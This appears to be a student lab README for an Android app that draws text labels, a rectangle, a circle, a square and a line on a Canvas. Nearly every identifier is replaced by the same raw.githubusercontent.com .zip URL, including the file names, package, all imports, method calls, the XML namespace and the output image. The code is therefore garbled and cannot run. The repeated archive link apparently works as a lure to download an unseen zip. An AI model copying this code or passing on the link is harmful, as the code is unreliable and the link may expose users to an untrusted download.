# https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip Design an application that draws basic graphical primitives on the screen.
## AIM:
To create and design an android application that draws basic graphical primitives on the screen using Android Studio.

## EQUIPMENTS REQUIRED:
Android Studio(Latest Version)

## ALGORITHM:
Step 1: Open Android Stdio and then click on File -> New -> New project.

Step 2: Then type the Application name as “graphical″ and click Next.

Step 3: Then select the Minimum SDK as shown below and click Next.

Step 4: Then select the Empty Activity and click Next. Finally click Finish.

Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip

Step 6: Draw basic object details give in MainActivity file.

Step 7: Save and run the application.

## PROGRAM:
/*
Program to create and design an android application that draws basic graphical primitives on the screen.
Developed by: SHAIK MUFEEZUR RAHAMAN
Registeration Number : 212221043007
*/



## https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip
```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout android:layout_height="match_parent"
    android:layout_width="match_parent"
    xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip">
    <ImageView
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:id="@+id/ImageView"/>
</RelativeLayout>


```
## https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip

```
package https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;

import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(savedInstanceState);
        setContentView(https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip);
        Bitmap bg = https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(720, 1280,
                https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip);
        ImageView i = (ImageView) findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(new BitmapDrawable(bg));
        Canvas canvas = new Canvas(bg);
        Paint paint = new Paint();
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(50);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip("Rectangle", 420, 150, paint);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(400, 200, 650, 700, paint);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip("Circle", 120, 150, paint);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(200, 350, 150, paint);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip("Square", 120, 800, paint);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(50, 850, 350, 1150, paint);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip("Line", 480, 800, paint);
        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(520, 850, 520, 1150, paint);

    }

}
```
## OUTPUT

<img src="https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip" width=200>

## RESULT

Thus a Simple Android Application to create and design an android application that draws basic graphical primitives on the screen using Android Studio is developed and executed successfully.
